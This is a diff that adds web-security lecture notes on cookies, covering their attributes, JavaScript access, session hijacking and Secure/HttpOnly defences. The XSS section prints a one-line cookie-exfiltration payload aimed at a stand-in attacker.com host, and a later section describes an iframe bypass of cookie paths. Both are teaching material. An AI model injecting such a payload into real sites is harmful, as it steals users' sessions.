@@ -116,9 +116,118 @@ After it is verified,we can process the information and repeat the cookies so as
 
 
 
+### History of Cookies
+
+- Implemented in 1994 in Netscape and described in a four-page draft
+- Had no spec for 17 years
+- Attempts were made in 1997 and 2000 to spec but had incompatible  changes thus were not successful
+- Finally in 2011 efforts succeeded and RF6265 was made.
+- Cookies have a very Ad-hoc design and have led to interesting issues.
+
+### Cookie Attributes
+
+`Expires` - Allows specific expiration date.If no date is specified,then lasts for session.
+Allows for expiring cookies and delete automatically  on end of session for the browser.
+
+Session Restoration is possible by browsers bringing back sessions and their cookies back.
+
+`Path` - Scope the "Cookie" header to a particula request path prefix.
+Scope cookies to be sent only at certain instances and cases.
+
+Eg: Path=/docs will match /docs and /docs/web
+
+Path is not totally secure for improving security
+
+- Cannot be used for security
+
+`Domain`- Allows the cookie to be scoped to a domain broader than the domain that returned the Set-Cookie header.
+
+E.g: login.stanford.edu could set a cookie for stanford.edu
 
 
+To attach cookie attributes add them to the set-cookie tagged along.
 
+### Accessing Cookies from JS
+
+```javascript
+document.cookie = 'name=shagun'
+
+document.cookie = 'favoriteFood=Cookies; Path=/'document.cookie
+
+// name=Feross; favoriteFood=Cookies;
+
+document.cookie = 'name=; Expires=Thu, 01 Jan 1970 00:00:00 GMT'
+
+document.cookie
+// favoriteFood=Cookies;
+```
+
+Though you can create cookies from JS there is no object to delete cookies and you have to regex to later delete a cookie from JS,though you have libs that help
+you do all this seamlessly but not js itself.
+
+### Session Hijacking
+
+- Sending cookies over unencrypted HTTP is a very bad idea
+- If anyone sees the cookie, they can use it to hijack the user's session
+- Attacker sends victim's cookie as if it was their own
+-  Server will be fooled
+
+Impersonate and MITM allows for it and have access to the hijack the session.
+
+Client sents a HTTP req with session id cookie where the id can be accessed by the attacker who can use the sesion id to then use it for 
+impersonation with your session and attack you account/access your details.
+
+### Mitigation Session hijacks
+
+You can make sure that the cookie is never set in an unencrypted network using the Secure tag in cookies.
+
+Use Secure cookie attribute to prevent cookie from being sent over unencrypted HTTP connections
+
+```javascript
+Set-Cookie: key=value; Secure
+```
+
+Even better: Use HTTPS for entire website not for the login page itself.
+
+
+### Session hijacking via Cross Site Scripting (XSS)
+
+>What if website is vulnerable to XSS?
+- Attacker can insert their code into the webpage
+- At this point, they can easily exfiltrate the user's cookie
+
+kicking off request using http where you inject your code using a Image() or any other for that matter.
+
+Exfilterate user cookie and use for attacking and stealing sessions.
+
+
+```javascript
+new Image().src ='https://attacker.com/steal?cookie=' + document.cookie
+```
+
+### Protect cookies from XSS
+- Use HttpOnly cookie attribute to prevent cookie from being read from JavaScript
+
+```js
+Set-Cookie: key=value; Secure; HttpOnly
+```
+
+To protect from session hijacking from XSS you can make it so that the cookie cannot be read from JS.
+document.cookie doesn't work anymore for the page.
+
+
+### Cookie Path Bypass
+
+Allows for iframe to access the cookie cross-site.
+
+Cookie path is initially used to only use/send cookies for particular url paths.
+
+- Do not use Path for security
+- Path does not protect against unauthorized reading of the cookie from a different path on the same origin
+- Can be bypassed using an `<iframe>` with the path of the cookie
+- Then, read iframe.contentDocument.cookie
+- This is allowed by Same Origin Policy
+- Therefore, only use Path as a performance optimization
 
 
 ### Further Reading
